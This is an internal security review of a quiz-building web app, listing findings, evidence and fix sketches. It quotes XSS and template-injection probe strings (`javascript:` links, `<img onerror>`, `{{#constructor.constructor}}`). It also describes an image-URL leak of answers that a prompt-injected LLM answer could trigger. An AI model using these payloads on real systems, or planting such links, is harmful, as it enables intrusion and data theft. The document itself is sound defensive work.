# Recap sprint, thread 7: security findings (2026-10-07)

What thread 7's review found, for thread 8 (which fixes the **certain** ones outside the sprint)
and the Coach. Each finding: severity, **certain** or **uncertain**, evidence (file:line at
`3f5cdd5`, the review's base), and a fix sketched. Read this file if you are thread 8, or are
deciding any of the *For the Coach* calls below. The same list, shorter, is in `whiteboard/TODO.md`
(*From recap sprint, thread 7: security*).

## Fixed in thread 7 (the sprint's own code)

| # | Fix | Commit |
|---|---|---|
| S1 | A template's own text counts against `FilledMax` each time a section writes it out, and what helpers are handed counts against a new `ShapedMax` (1,000,000). A 3,472-character field template (`{{#quote}}` around three nested `{{#qns}}` repeating blank lines) ran Node out of memory, so a co-smith's template could kill every smith's tab; 150 nested `{{#quote}}`s over 80k characters took 1.5 s per cell per render. | 040f219 |
| S2 | The dialect's indent rule (`Markdown.indentsAsQuotes`/`quotedByIndent`) found markdown's own lines by walking every block for every line: quadratic. A filled template may reach 100,000 characters: 1.3 s per face, 16 s at 300,000. Now one pass. | 0f5d08f |
| S3 | **Decision: reviewers' words keep no images on sight.** An image in a review (overall, guesses, comments, and the reviewer's own faces on the playtest) is drawn as a link to it (`imagesAsLinks`), fetched only if followed. Otherwise a reviewer could make every smith's browser call on an address of the reviewer's choosing by opening the Reviews panel. Smiths' texts keep images, which a picture round needs reviewers to see. Two-way door. | 1d0a349 |

## Sprint code, checked and sound

* **Template helpers and the writer** (thread 17, `src/lib/templating.ts`): the registry is frozen
  and read only by `Object.hasOwn`; `BagContext.lookup` reads own keys only and never returns a
  function, so nothing in the bag is ever called (`{{#constructor}}`, `{{__proto__}}`,
  `{{#qns.0.fn}}`, a function under a helper's name: all nothing, probed). Raw tags refused under any
  delimiters (`{{=<% %>=}}<%& x %>`); partials refused. Labels cannot be `__proto__`
  (`PA.Label` starts with a letter). Budgets now hold for literal text and helper work (S1).
* **`src/lib/shaping.ts`**: pure string work; its one cost, `Markdown.indentsQuoted`, is now linear (S2).
* **Sanitizer last, every path.** Screen: fill -> `indentsQuoted` -> react-markdown (HTML handler
  writes text) -> `rehype-sanitize` (`Markdown.Allowlist`) -> dressing that adds only
  `target`/`rel`/`loading`/`referrerPolicy`. Probed: entity-encoded and upper-case `javascript:`,
  `vbscript:`, `data:` links and images, `//host` and `https:/\host` images, `<img onerror>`,
  `<details ontoggle>`, `<style>`: all inert. bbjank: fill -> mdast -> writer; probed entity and
  tab-split `javascript:`, protocol-relative, backslash, `data:`, http images, `]`/`"` in addresses
  (percent-encoded by `normalizeUri`), reference definitions, tag arguments (softened): all held.
  The recap fills each text once; filled values are never filled again.
* **bbjank's protocol sets stay its own** (links http/https, images https), not shared with
  `Markdown.Allowlist` (which also allows `mailto` links): both are strict, and the board has no use
  for `mailto`. Decided; no change.
* **New actions and policy**: `set_recap_head/tail/template`, `set_templated` (layout),
  `enter_quiz_widgeted` all `mayReviseClaimedQuiz` (smith, unlocked) in `src/lib/approve.ts`;
  `rebranch_hunt` unchanged (`mayChangeHunt`). Zod strips extra keys, so `setQuizNote`'s
  `_.omit(action, ['kind'])` writes only its field. `enterQuizWidgeted` finds the widgeting in the
  affirmed quiz's layout, at tier `quiz`, its widget an entry, the value held to its kind.
* **`quiz_widgeteds`**: `HuntOwned` in `WritingRules`/`ReadingRules`; read only through
  `quizStoredOf` (smiths, via `Question.isSent('stored', standing)` in `quizzes.open`) and
  `quizRowsFor` (export, smiths). Reviewers are sent none.
* **Console reports of template errors** (`use-face.ts`): field name, quiz and question labels,
  and mustache's message (tag or section names the author typed). No values, no template text.
* **New reserved labels** (`recap`, `archived`, `secondary`; `questions` for a quiz-wide
  widgeting): a deploy concern already with the Coach, not a security one.

## Sprint code, left (uncertain or a design call)

1. **A filled value can make an image fetch** -- low (medium with O2); **uncertain**. A templated
   field fills in column values (`src/lib/templating.ts:393-398`, `fillingOf`) before the parser, so
   a value from a library formula or an `aibot` answer that holds `![](https://host/?q=...)` draws
   an image whose address can carry quiz text (answers) to that host. Needs a smith to template a
   field reading such a column; an LLM answer steered by prompt injection, or a library formula
   anyone may edit (O2), supplies the value. Fix sketch: fix O2; and either draw images only from
   text a person typed (images in filled values as links, `imagesAsLinks`-style), or leave it as the
   cost of images in templates. The Coach's call.
2. **Each templated face may fill to 100,000 characters** -- low; **uncertain**. Every cell
   re-fills and re-parses on render (`src/components/cells/use-face.ts:19`), so a quiz of many
   templated cells, each near the cap, costs the parse of each (react-markdown is about 1 s per
   100k). Fix sketch: memoize `faceOf` by text and bag, or a lower cap for field templates than for
   the recap.
3. **`{{.}}` fills in the whole bag's JSON** (every question, archived ones and answers included).
   Info: the reader's own data in their own browser; noted because the recap is pasted publicly.

## Outside the sprint (thread 8 fixes the certain ones)

**O1. The ask route checks no session and nothing limits it** -- high; **certain** (the issue);
the fix needs one small design call.
`src/app/api/ask/route.ts:28-49`: any POST that parses gets a Claude answer on the server's key,
`careful` tier (`claude-opus-5`, `src/lib/ask/models.ts`) and `max_tokens` as the request says,
wherever `ENABLE_ANTHROPIC_BOT=allow`. An open, paid LLM proxy. Fix sketch: the browser sends its
Convex Auth token (`Authorization: Bearer`); the route asks Convex who that is
(`fetchQuery(api.idents.current, {}, { token })`) and refuses an anonymous or unidentified
caller; a per-ident rate limit (`@convex-dev/rate-limiter`, a mutation the route calls, or a
counter row) and a hard cap on `max_tokens`. The design call: whether "identified" is enough or the
caller must be a smith somewhere (`Approve` gets an `ask_anthropic_bot` evidence change either way).

**O2. Everyone with a username is an admin of the shared library** -- medium/high; **certain**
(the issue); the fix needs the Coach to say who the admins are.
`src/lib/actor.ts:58-60` (`isAdmin` returns `true`), used by `src/lib/approve.ts:226-234`
(`mayChangeLibrary`), `convex/policy_rules.ts:146-148`, `convex/widgets.ts` (`widgets.perform`,
`widgets.usage`), `convex/stats.ts` (`stats.backfills`). Anyone who asserts a username can rewrite
any library widget's formula or prompt, which changes every quiz in every hunt that works it (and,
with images, see sprint item 1), delete unused widgets, or fill the library to its cap (999). The
doc block says it is a placeholder. Fix sketch: decide admins by something no one can choose for
themselves: an `is_admin` flag on the ident set only by an internal mutation (the browser's
offers read it from `idents.current`), or an env allowlist of user ids read on the server; until
then `false`, seeding the library through internal functions.

**O3. Unheld idents go to the first session to ask, and `hunts.open` names each hunt's smiths to
anyone** -- medium while unclaimed legacy idents exist in production; **certain** in code,
**uncertain** in production. `convex/writing/account_actions.ts:48-53` (`claimFor` gives an ident
with `user_id: null` to whoever asserts it); `convex/hunts.ts` `open` (no session needed) returns
`smithsOf(members)` (`src/lib/rows.ts:419-421`). A stranger learns a hunt's smiths' usernames and
asserts any not yet re-claimed since the Convex Auth move, becoming that smith on all their hunts.
`notes/deploy.md` already accepts the race. Fix sketch: the Coach closes out unheld idents (assign
or retire them); `hunts.open` names smiths only to a session with a username.

**O4. `askerOf` trusts the newest identing without checking the ident is still the session's** --
info (defense in depth); **certain**, not exploitable today. `convex/reading.ts:23-26`
(`identFor`), `convex/functions.ts:41-43`. Fix: treat `ident.user_id !== user_id` as anonymous, with
a test.

**O5. One session can use up the app's hunt cap** -- low; **certain**.
`convex/writing/account_actions.ts:88-91` refuses past `PA.HuntsInApp.max` (999,
`src/lib/vv/patterns.ts:282`), counted across the app, with no per-ident limit; anonymous sign-in is
unlimited (`convex/auth.ts`). Fix sketch: a per-ident cap on hunts made, or a rate limit on
`new_hunt` and sign-in.

**O6. No security headers** -- low; **certain** (the absence); the CSP part **uncertain**.
`next.config.ts` sets no `headers()`. Clickjacking matters little (the token lives in partitioned
localStorage), but nothing limits an XSS, which would take a refresh token good for years
(`convex/auth.ts`, `totalDurationMs: 3650 * DayMs`): a permanent username takeover. Fix sketch:
`frame-ancestors 'none'`, `X-Content-Type-Options: nosniff`, `Referrer-Policy:
strict-origin-when-cross-origin` now (certain); a `script-src` CSP needs Next's inline scripts
handled (nonces), so try it on a preview first (uncertain).

**O7. Prompt templates use mustache's own context** -- low; **certain**.
`src/lib/ask/prompts.ts:23` (`Mustache.render` with the default `Context`): `{{constructor}}`,
`{{#constructor.constructor}}` reach the prototype and call `Function` (building, never running,
a function); output goes only to the model. Fix sketch: render prompts through an own-keys context
as `Templating` does (export a helper-less writer and context from `templating.ts`, or a shared
`lib/mustachery.ts`), with tests from `tests/lib/templating.test.ts`'s inherited cases.

**O8. A formula can hold the page for a long time** -- low (medium with O2); **uncertain** how
easily tuned. `src/lib/formulas.ts:8,91-100`: a 100 ms timebox per evaluation, checked at
JSONata's hooks; a column stops only after one evaluation times out
(`src/lib/formulary/runner.ts:436-441`); on the main thread. ~90 ms per question x 999 questions per
widgeting never trips it; one builtin (`$pad('', 2e8)`) runs to completion before the clock is
read. Fix sketch: a total budget per quiz run, or formulas in a Worker that can be terminated.

**O9. Images reach any https address, the viewer's network included** -- info; **certain**.
`src/lib/markdown.ts:22` admits any `https://host`: an image to `https://192.168.1.1/...` is a GET
from the viewer's browser into their own network. GET-only and https-only; the cost of images.
No fix proposed beyond the Coach's awareness.

### Checked outside the sprint and sound (the sweep's summary)

Public functions match `Unscoped` plus the scoped builders; test, seed and migration functions are
internal; `affirmForHunt` checks ident, standing, quiz, realm and named quiz; question ids bind to
the affirmed quiz; account actions naming a hunt need a smith; reviews are read only through
`mayReadReview`; no `dangerouslySetInnerHTML`, `eval`, `new Function`, `window.open` or
`postMessage`; imports re-validated by Zod, no prototype pollution found (`EST.merge` skips
`__proto__`); hunt git is local only; `credentials.ts` server-only, never logged; `NEXT_PUBLIC_*`
holds no secret; jsonata 1.8.9 (past CVE-2024-27307).
